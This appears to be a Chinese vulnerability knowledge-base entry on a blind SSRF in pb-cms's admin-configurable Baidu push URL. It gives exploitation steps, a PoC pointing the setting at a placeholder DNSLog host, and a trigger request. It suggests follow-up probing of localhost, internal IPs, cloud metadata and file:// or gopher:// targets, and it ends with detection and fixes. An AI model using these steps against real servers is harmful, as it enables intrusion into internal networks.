---
id: web-generic-ssrf-configurable-push-url-blind
title: 后台配置推送地址直接 new URL().openConnection()：盲 SSRF 打内网与 DNSLog 验证
type: scenario
domain: web
path: web/generic/ssrf
technique: configurable-push-url-blind-ssrf
aliases:
- 百度推送地址 SSRF
- 后台配置 URL SSRF
- postBaidu SSRF
- 盲 SSRF DNSLog
- URL.openConnection 配置注入
- pushBatch SSRF
tags:
- ssrf
- java
- urlconnection
- blind
- dnslog
- cms
- config-injection
cve: []
severity: medium
confidence: high
status: verified
affected_versions: pb-cms v1.0.0（原文项目/版本）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V35
  verified_at: '2026-11-05T05:59:59+08:00'
  notes: 已对照原文核对：PushArticleUtil#postBaidu 的 new URL(postUrl).openConnection()、ArticleController#pushBatch 取 BAIDU_PUSH_URL、后台改 DNSLog 域名并批量推送触发；原文为盲 SSRF（不回显），截图仅见 DNSLog 解析记录；未在本机复现。
---

## 一句话结论

某瀑布内容管理系统（pb-cms）的“百度推送”功能把后台配置的 `BAIDU_PUSH_URL` 直接传给 `PushArticleUtil.postBaidu()`，函数内执行 `new URL(postUrl).openConnection()` 并发起 POST；把该配置改成 DNSLog 域名后触发批量推送，即可让服务器向外发起请求，形成盲 SSRF。

## 原理

- **配置写入**：后台“网站管理 → 基础设置”中的“百度推送地址”保存到系统配置表（`SysConfigKey.BAIDU_PUSH_URL`），没有协议/内网地址校验。
- **读取与请求**：`ArticleController#pushBatch` 调 `configService.selectAll().get(SysConfigKey.BAIDU_PUSH_URL.getValue())` 取出该 URL，传给 `PushArticleUtil.postBaidu(url, urls)`。
- **Sink**：`postBaidu` 执行 `conn = new URL(postUrl).openConnection()`，随后设置 `Host: data.zz.baidu.com`、`User-Agent`、`Content-Type`，写入参数并读取响应。`postUrl` 完全来自配置，攻击者可控时服务器会向任意地址发起请求。
- **盲打**：接口只把 `PushArticleUtil.postBaidu` 的返回 JSON 解析为 `BaiduPushResVo`；若目标不是百度接口，解析失败只返回“推送文章失败”，不回显响应内容。原文用 Yakit DNSLog 域名验证收到解析记录，证明请求已发出。
- **权限**：需要能进入后台并修改基础设置（管理员或被授予该权限的账号）；原文还需修正权限表与用户表权限不一致的问题才能访问推送功能。属于认证后/后台 SSRF，而非前台未授权。
- **影响**：可探测内网服务、访问仅内网可达的接口、请求云元数据（若网络策略允许）；因无回显，通常用于端口/服务探测、DNS 外带、结合内网漏洞打组合链。

## 触发条件

- 目标为 pb-cms v1.0.0（或同样把“推送/回调/Webhook 地址”做成后台配置并直接 `new URL(...).openConnection()` 的实现）。
- 攻击者可进入后台修改“百度推送地址”，或能直接写系统配置表。
- 应用服务器可访问目标内网/DNS 出网。
- 存在“批量推送”等触发入口，能把配置 URL 送入请求函数。

## 利用步骤

1. 登录后台，进入“网站管理 → 基础设置”，把“百度推送地址”改为 DNSLog 域名（如 `http://<random>.dnslog.cn`）。
2. 进入“文章管理 → 文章列表”，勾选文章点击“批量推送”。
3. 服务端调用 `postBaidu`，向该域名发起 HTTP 请求；DNSLog 平台收到解析记录即证明 SSRF 成立。
4. 将地址换成 `http://127.0.0.1:<port>/`、内网 IP、云元数据地址等，按响应时间/错误差异判断端口与服务；无回显时可结合 DNS/HTTP 外带。
5. 若内网存在可利用服务（Redis、管理后台、云元数据），进一步构造请求。

## PoC

后台配置：

```text
百度推送地址: http://<random>.dnslog.cn
```

触发：

```http
POST /cms/article/batch/push HTTP/1.1
Host: target:8080
Cookie: JSESSIONID=<admin session>
X-CSRF-Token: <csrf>

urls[]=http://target/article/1
```

漏洞代码：

```java
public static String postBaidu(String postUrl, String[] parameters) {
    URLConnection conn = new URL(postUrl).openConnection();
    conn.setRequestProperty("Host", "data.zz.baidu.com");
    conn.setRequestProperty("User-Agent", "curl/7.12.1");
    conn.setRequestProperty("Content-Type", "text/plain");
    conn.setDoInput(true);
    conn.setDoOutput(true);
    ...
}
```

DNSLog 收到解析记录即验证成功。

## 变体与关联

- 变体：其他后台可配置的回调/Webhook/推送地址、图片代理、远程抓取 URL，只要进入 `new URL(...).openConnection()`、`HttpClient`、`RestTemplate` 等 sink 都可复用。
- 变体：若响应被解析/回显（如推送结果、错误详情），可升级为回显型 SSRF；本例只回显“推送失败”。
- 变体：用 `file://`、`gopher://` 等协议（取决于 JDK `URL` 支持的协议）读取本地文件或打内网协议；原文未验证。
- 关联：[[web-generic-ssrf-avatar-urlopen-internal-service]]（同为 `urlopen`/`URL.openConnection()` 未校验内网，但那条是前台头像抓取且有回显；本条是后台配置 + 盲 SSRF）。
- 关联：[[web-generic-ssrf-ip-notation-blacklist-bypass]]、[[web-generic-ssrf-url-parser-differential-allowlist-bypass]]（若目标有地址校验时的绕过）。

## 检测与防御

- **检测**：系统配置中的推送/回调 URL 指向非业务域名、内网 IP、DNSLog 域名；`/article/batch/push` 等触发接口后出现异常 DNS/HTTP 外连；服务器向 127.0.0.1、10/172.16/192.168 网段发起请求。
- **检测**：后台配置变更日志中出现 `http://` 非预期域名；推送功能错误日志含 `UnknownHostException`/连接超时。
- **修复**：推送地址使用固定域名白名单（如仅 `data.zz.baidu.com`），不要把用户配置直接传给 `new URL()`；对 URL 做解析后校验 scheme、host、解析后的 IP，拒绝内网/回环/链路本地地址；禁用不需要的协议。
- **加固**：后台配置修改需二次确认与审计；推送请求走独立出口代理并限制目标；服务器出网最小化；对 SSRF 目标做 DNS rebinding 防护（解析后固定 IP 再连接）。
